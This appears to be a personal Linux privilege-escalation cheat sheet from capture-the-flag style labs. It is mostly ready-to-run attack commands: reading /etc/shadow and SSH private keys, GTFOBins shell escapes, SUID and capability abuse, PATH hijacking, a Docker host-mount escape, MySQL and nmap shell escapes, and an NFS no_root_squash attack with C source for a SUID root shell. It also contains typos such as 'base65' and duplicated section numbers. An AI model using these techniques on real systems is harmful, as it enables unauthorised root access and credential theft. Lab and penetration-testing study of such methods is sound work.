
---

## 🔍 1. **System Information Enumeration**

```bash
uname -a
cat /etc/os-release
hostnamectl
id
whoami
sudo -l
```

---

## 📁 2. **Check File & Directory Permissions**

```bash
find / -perm -4000 2>/dev/null           # SUID files
find / -perm -2000 2>/dev/null           # SGID files
find / -writable -type d 2>/dev/null     # World-writable directories
find / -name "*.*history" 2>/dev/null    # Bash history files
```

---

## 🧪 3. **Sudo Misconfigurations**

```bash
sudo -l
```

**Exploits:**

- **Run as root without password:**
    
    ```bash
    sudo su
    sudo -i
    ```
    
- **Run specific commands (GTFOBins):**  
    If `sudo` can run a command like `less`, `vim`, `find`, `awk`, etc.:
    
    ```bash
    sudo <binary>    # Check on https://gtfobins.github.io/
    ```
    

---

## 🔓 4. **SUID Binaries**

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Exploit with GTFOBins:**

```bash
# Example
/usr/bin/find . -exec /bin/sh \; -quit
```

###### the one i found the most is 

if base64 is SUID binary

then  we can do etc shadow file read

```sh
LFILE=/etc/shadow
base65 "$LFILE" | base64 -d  #gets the contents of /etc/shadow
```

then we can **unshadow** them and crack with **john**.

---

## 📦 5. **Interesting Files with Credentials**

```bash
cat /etc/passwd
cat /etc/shadow     # If accessible
cat ~/.ssh/id_rsa
cat ~/.bash_history
grep -r "password" /home/* 2>/dev/null
```

---

## ⚙️ 6. **Scheduled Jobs (Cron Jobs)**

```bash
cat /etc/crontab
ls -la /etc/cron*
```

**Look for:**

- Writable scripts being run as root
    
- Output redirection to world-writable files
    

---

## 🛠️ 7. **Services & Processes**

```bash
ps aux
netstat -tulpn
```

- Look for root-owned processes you can interact with
    
- Check misconfigured services (e.g., running backups via scripts you can edit)
    

---

## 💉 8. **Kernel Exploits**

```bash
uname -r
```

Search for local exploits using [https://www.linuxkernelcves.com/](https://www.linuxkernelcves.com/) or [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

---

## 🧰 9. **Docker / LXC Escape**

Check if inside a container:

```bash
cat /proc/1/cgroup
```

If you're in a container but can run Docker on the host:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## 📚 10. **Useful Tools**

Install or look for these on the system:

- `linpeas.sh`
    
- `les.sh`
    
- `linux-exploit-suggester.sh`
    
- `pspy` (for process spying)
    
- `GTFOBins`
    

---

## 🔧 11. **Writable `PATH` Abuse**

Check if user-writable directory is in `PATH`:

```bash
echo $PATH
```

Exploit:

```bash
echo -e '#!/bin/bash\n/bin/bash' > /tmp/fakebinary
chmod +x /tmp/fakebinary
export PATH=/tmp:$PATH
some_command     # If root executes it
```

---

## 🧠 12. **Capabilities (capsh)**

```bash
getcap -r / 2>/dev/null
```

Example:

```bash
/usr/bin/python3.8 = cap_setuid+ep
# Exploit:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 🧨 13. **NFS / FSTAB / Mount Privileges**

Check `/etc/fstab` and mount permissions:

```bash
cat /etc/fstab
mount
```

If you can mount with `uid=0`, you may be able to escalate.

---

## 🧼 14. Mysql
if MySQL service is running as root we can 
```bash
mysql>>>    select do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out');

mysql>>> \! sh
$ cat /tmp/out >>>>>> result of the above command.
```


### 15. Nmap

```sh
nmap --interactive

nmap>  !sh

# rooooteddddddddddddddddddddddddd
```
---
# 14. PATH

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?


A simple search for writable folders can done using the “
`find / -writable 2>/dev/null`
” command. The output of this command can be cleaned using a simple cut and sort sequence.


An alternative could be the command below.

`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`


I used SUID Binary to exploit PATH
there was a file **/home/murdoch/test**

when i run it i tries to find the bin thm which was not in the path 


i can exploit this but i have to create a fake one and add it to the path.

out exploit (thm)
```sh
karen@ip-10-10-137-255:/home/murdoch$ cat thm
#!/bin/bash
/bin/bash
```

set it to path
`export PATH=/home/murdoch:$PATH`

and run the suid binary i.e : ./test

```sh
karen@ip-10-10-137-255:/home/murdoch$ ./test
root@ip-10-10-137-255:/home/murdoch# 
```


# 15. NFS
Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.  
  
NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.



Look for `/etc/exports` (on the server) or use `showmount` (on your attack box):

```sh
showmount -e <target-ip>
```

OUTPUT: 
```
Export list for 10.10.10.10:
/mnt/nfs *(rw,no_root_squash,sync)
```


`no_root_squash` is what we want — it means **UID 0 is not mapped to nobody**, which is dangerous.

Mount the NFS Share on Your Attack Box

```
mkdir /tmp/nfs
sudo mount -o rw <target-ip>:/mnt/nfs /tmp/nfs

```

Test write acess

```
touch /tmp/nfs/testfile

```


#### Create a SUID Binary (on Your Machine)

We’ll make a simple root shell:
```sh 
cat <<EOF > /tmp/rootshell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

gcc /tmp/rootshell.c -o /tmp/rootshell
chmod +s /tmp/rootshell

```

This binary will give root when executed.

Copy it to the NFS Share

```
cp /tmp/rootshell /tmp/nfs/

```

On the Target Machine
```sh
ls -l /mnt/nfs/rootshell
-rwsr-xr-x 1 root root 12345 Jul  2 00:00 rootshell

```

```runit
/mnt/nfs/rootshell

```
## If You Don’t Have NFS Info Yet

Check for mounts or exports:
```sh
mount | grep nfs
cat /etc/fstab

OR


cat /etc/exports # if you are on the NFS server
```

